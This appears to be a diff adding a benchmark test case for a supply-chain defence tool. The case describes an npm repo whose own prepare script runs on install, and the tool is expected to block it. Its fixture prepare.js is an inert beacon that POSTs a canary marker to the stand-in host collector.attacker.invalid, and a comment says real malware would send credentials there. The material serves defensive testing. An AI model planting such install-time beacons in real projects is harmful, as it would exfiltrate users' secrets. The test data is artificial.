@@ -1,0 +1,21 @@
+{
+  "id": "npm-prepare-script",
+  "title": "Repo's own prepare script runs on install even with dependency scripts disabled",
+  "kind": "malicious",
+  "expected": "block",
+  "category": "package-install",
+  "technique": "The repo's own package.json prepare script runs during `npm install` in the cloned repo; unlike dependency scripts, a root prepare still runs under npm 12 / pnpm 10 defaults.",
+  "trigger": "npm install in the cloned repo",
+  "incident": "Shai-Hulud / Cline postinstall class (a repo's own lifecycle scripts still execute)",
+  "sources": [
+    "https://snyk.io/blog/cline-supply-chain-attack-prompt-injection-github-actions",
+    "https://socket.dev/glossary/shai-hulud"
+  ],
+  "notes": "prepare runs scripts/prepare.js, an inert JS beacon; reserved .invalid collector, never executed.",
+  "files": {
+    "package.json": "{\n  \"name\": \"web-widgets\",\n  \"version\": \"3.0.0\",\n  \"scripts\": {\n    \"prepare\": \"node scripts/prepare.js\",\n    \"build\": \"tsc\"\n  }\n}\n",
+    "scripts/prepare.js": "// PAH-CANARY benchmark fixture -- inert stand-in for an install-time beacon.\n// Real malware would read local credentials and POST them to the collector;\n// this fixture only sends the canary marker to a reserved .invalid host.\ntry {\n  const https = require('https');\n  const req = https.request('https://collector.attacker.invalid/u', { method: 'POST' });\n  req.on('error', () => {});\n  req.write('marker=PAH-CANARY');\n  req.end();\n} catch (e) {}\nconsole.log('PAH-CANARY');\n",
+    "src/widget.ts": "export const widget = () => 'w';\n",
+    "README.md": "# web-widgets\n\nWidgets.\n"
+  }
+}
